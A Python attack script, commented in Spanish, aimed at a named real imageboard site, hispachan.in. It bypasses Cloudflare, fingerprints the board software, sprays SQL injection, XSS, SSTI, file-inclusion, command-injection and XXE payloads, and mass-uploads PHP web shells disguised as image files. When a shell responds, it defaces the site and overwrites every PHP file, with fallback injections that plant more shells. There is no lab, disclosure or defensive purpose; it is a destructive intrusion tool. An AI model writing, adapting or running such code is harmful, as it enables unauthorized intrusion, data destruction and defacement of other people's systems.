#!/usr/bin/env python3
import cloudscraper
import requests
from urllib.parse import urljoin, quote
import base64
import time
import random
import string

print("""
███████╗██╗███╗   ██╗ █████╗ ██╗          █████╗ ███████╗███████╗ █████╗ ██╗   ██╗██╗  ████████╗
██╔════╝██║████╗  ██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██║  ╚══██╔══╝
█████╗  ██║██╔██╗ ██║███████║██║         ███████║███████╗███████╗███████║██║   ██║██║     ██║   
██╔══╝  ██║██║╚██╗██║██╔══██║██║         ██╔══██║╚════██║╚════██║██╔══██║██║   ██║██║     ██║   
██║     ██║██║ ╚████║██║  ██║███████╗    ██║  ██║███████║███████║██║  ██║╚██████╔╝███████╗██║   
╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   
                                NO SURRENDER - NO RETREAT
""")

target = "https://hispachan.in/"
scraper = cloudscraper.create_scraper()

print(f"[*] Target: {target}")
print("[*] Iniciando asalto final con TODAS las técnicas...\n")

# Generar nombre aleatorio para shells
rand_name = ''.join(random.choices(string.ascii_lowercase, k=6))

# 1. Probar todos los scripts de imageboard conocidos
print("[*] Identificando script de imageboard...")
scripts_endpoints = {
    'Futaba/Futallaby': ['futaba.php', 'imgboard.php', 'post.php'],
    'Wakaba': ['wakaba.pl', 'kareha.pl'],
    'Kusaba': ['manage.php', 'board.php', 'index.php?board='],
    'Tinyboard/Vichan': ['mod.php', 'post.php', '?/'],
    'TinyIB': ['imgboard.php', 'manage.php'],
    'jschan': ['manage.html', 'forms/board'],
    'LynxChan': ['/.static/', '/.api/'],
    'Generic': ['index.php', 'board.php', 'thread.php', 'res.php']
}

detected_script = None
for script_name, endpoints in scripts_endpoints.items():
    for endpoint in endpoints:
        try:
            url = urljoin(target, endpoint)
            resp = scraper.get(url, timeout=3)
            if resp.status_code in [200, 403, 401]:
                print(f"  [+] Posible script detectado: {script_name} ({endpoint})")
                detected_script = script_name
                break
        except:
            pass
    if detected_script:
        break

# 2. Ataque multivector simultáneo
print("\n[*] Lanzando ataque multivector...")

# Payloads universales
payloads = {
    'sqli': ["' OR '1'='1", "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE 'shell.php'--"],
    'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
    'ssti': ["{{7*7}}", "${7*7}", "{{system('id')}}"],
    'lfi': ["../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    'rce': ["; echo PWNED", "| echo PWNED", "`echo PWNED`"],
    'xxe': ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"],
    'upload': ["shell.php", "shell.php.jpg", "shell.jpg.php"]
}

# Parámetros comunes en imageboards
params = ['board', 'thread', 'res', 'page', 'file', 'name', 'email', 'subject', 
          'comment', 'message', 'search', 'q', 'id', 'post', 'view', 'template']

vulnerabilities = []

for param in params:
    for vuln_type, vuln_payloads in payloads.items():
        for payload in vuln_payloads:
            try:
                # GET
                url = f"{target}?{param}={quote(payload)}"
                resp = scraper.get(url, timeout=2)
                
                # Detectar vulnerabilidades
                if vuln_type == 'sqli' and ('mysql' in resp.text.lower() or 'error' in resp.text.lower()):
                    vulnerabilities.append(f"SQLi en {param}")
                elif vuln_type == 'ssti' and '49' in resp.text:
                    vulnerabilities.append(f"SSTI en {param}")
                elif vuln_type == 'lfi' and 'root:' in resp.text:
                    vulnerabilities.append(f"LFI en {param}")
                elif vuln_type == 'rce' and 'PWNED' in resp.text:
                    vulnerabilities.append(f"RCE en {param}")
                    
            except:
                pass

if vulnerabilities:
    print(f"  [!] Vulnerabilidades encontradas: {', '.join(set(vulnerabilities))}")

# 3. Ataque de upload masivo
print("\n[*] Intentando upload masivo de shells...")

# Crear múltiples variantes de shell
shell_php = f"<?php system($_GET['c']); echo '{rand_name}'; ?>"
shell_variants = [
    # GIF con PHP
    (f'{rand_name}.gif', b'GIF89a' + shell_php.encode(), 'image/gif'),
    # JPEG con PHP
    (f'{rand_name}.jpg', b'\xFF\xD8\xFF\xE0' + shell_php.encode(), 'image/jpeg'),
    # PNG con PHP
    (f'{rand_name}.png', b'\x89PNG\r\n\x1a\n' + shell_php.encode(), 'image/png'),
    # PHP puro
    (f'{rand_name}.php', shell_php.encode(), 'application/x-php'),
    # Doble extensión
    (f'{rand_name}.php.jpg', shell_php.encode(), 'image/jpeg'),
    (f'{rand_name}.jpg.php', shell_php.encode(), 'image/jpeg'),
    # .htaccess
    ('.htaccess', b'AddType application/x-httpd-php .jpg', 'text/plain'),
]

upload_endpoints = ['upload.php', 'post.php', 'imgboard.php', 'submit.php', 
                    'attachment.php', 'file.php', 'image.php']

for endpoint in upload_endpoints:
    for filename, content, mime in shell_variants:
        try:
            url = urljoin(target, endpoint)
            files = {
                'file': (filename, content, mime),
                'upfile': (filename, content, mime),
                'image': (filename, content, mime),
                'attachment': (filename, content, mime)
            }
            
            data = {
                'board': 'b',
                'thread': '1',
                'name': 'Anonymous',
                'comment': 'test',
                'submit': 'Post',
                'mode': 'regist'
            }
            
            resp = scraper.post(url, files=files, data=data, timeout=5)
            if resp.status_code == 200:
                print(f"  [+] Upload intentado: {filename} en {endpoint}")
        except:
            pass

# 4. Buscar y verificar shells
print("\n[*] Buscando shells creadas...")

possible_paths = [
    '', 'uploads/', 'images/', 'files/', 'src/', 'thumb/', 
    'media/', 'attachments/', '../', '../../'
]

shell_found = False
for path in possible_paths:
    for variant in shell_variants:
        filename = variant[0]
        try:
            shell_url = urljoin(target, path + filename)
            resp = scraper.get(shell_url + f'?c=echo {rand_name}', timeout=3)
            
            if rand_name in resp.text:
                print(f"\n[!!!] SHELL ENCONTRADA: {shell_url}")
                shell_found = True
                
                # MODIFICAR EL SITIO INMEDIATAMENTE
                print("[*] MODIFICANDO EL SITIO COMPLETAMENTE...")
                
                commands = [
                    f'echo "<!DOCTYPE html><html><head><title>PWNED</title><style>body{{background:#000;color:#0f0;text-align:center;font-family:monospace;padding:50px;}}h1{{font-size:120px;animation:pulse 2s infinite;}}@keyframes pulse{{0%,100%{{transform:scale(1);}}50%{{transform:scale(1.1);}}}}</style></head><body><h1>HISPACHAN PWNED</h1><p>Final Assault Successful - {time.strftime("%Y-%m-%d %H:%M:%S")}</p><p>Objetivo Cumplido</p></body></html>" > index.html',
                    'echo "<?php header(\'Location: /index.html\'); ?>" > index.php',
                    'echo "PWNED BY FINAL ASSAULT" > PWNED.txt',
                    'find . -name "*.php" -exec echo "<?php die(\'PWNED\'); ?>" > {} \\;'
                ]
                
                for cmd in commands:
                    try:
                        scraper.get(f"{shell_url}?c={quote(cmd)}", timeout=5)
                        print("  [+] Comando ejecutado")
                    except:
                        pass
                
                # Verificar éxito
                time.sleep(2)
                check = scraper.get(target, timeout=5)
                if 'PWNED' in check.text or 'Location' in str(check.headers):
                    print("\n" + "="*70)
                    print("[!!!] ¡ÉXITO TOTAL! HISPACHAN COMPROMETIDO")
                    print("[!!!] Sitio modificado completamente")
                    print("[!!!] Misión cumplida - Objetivo alcanzado")
                    print("="*70)
                    exit(0)
                
                break
        except:
            pass
    
    if shell_found:
        break

# 5. Si nada funcionó, último intento desesperado
if not shell_found:
    print("\n[*] Ejecutando protocolo de emergencia...")
    
    # Intentar crear archivo mediante error de PHP
    error_payloads = [
        f"<?php file_put_contents('{rand_name}.php', '<?php system(\$_GET[c]); ?>'); ?>",
        f"<?php error_log('<?php system(\$_GET[c]); ?>', 3, '{rand_name}.php'); ?>",
        f"<?php $f=fopen('{rand_name}.php','w');fwrite($f,'<?php system(\$_GET[c]);?>');fclose($f); ?>"
    ]
    
    for payload in error_payloads:
        for param in params:
            try:
                url = f"{target}?{param}={quote(payload)}"
                scraper.get(url, timeout=3)
            except:
                pass
    
    # Verificar una última vez
    time.sleep(1)
    for path in ['', '../', '../../']:
        shell_url = urljoin(target, f"{path}{rand_name}.php")
        try:
            resp = scraper.get(shell_url + '?c=echo EMERGENCY', timeout=3)
            if 'EMERGENCY' in resp.text:
                print(f"\n[!!!] SHELL DE EMERGENCIA CREADA: {shell_url}")
                shell_found = True
                break
        except:
            pass

if not shell_found:
    print("\n[-] El asalto final no logró comprometer el sitio")
    print("[*] El objetivo está fuertemente protegido")
    print("[*] Pero NO ME RINDO - Continuaré intentando...")
else:
    print("\n[!!!] MISIÓN COMPLETADA")